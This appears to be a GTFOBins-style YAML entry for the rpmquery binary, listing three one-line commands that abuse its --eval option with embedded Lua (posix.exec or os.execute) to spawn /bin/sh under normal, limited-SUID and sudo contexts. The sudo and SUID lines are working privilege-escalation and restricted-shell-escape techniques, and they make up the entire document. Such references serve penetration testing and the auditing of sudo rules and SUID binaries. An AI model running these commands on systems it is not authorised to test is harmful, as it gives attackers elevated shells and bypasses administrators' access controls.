---
functions:
  shell:
    - code: rpmquery --eval '%{lua:posix.exec("/bin/sh")}'
  limited-suid:
    - code: ./rpmquery --eval '%{lua:os.execute("/bin/sh")}'
  sudo:
    - code: sudo rpmquery --eval '%{lua:posix.exec("/bin/sh")}'
---
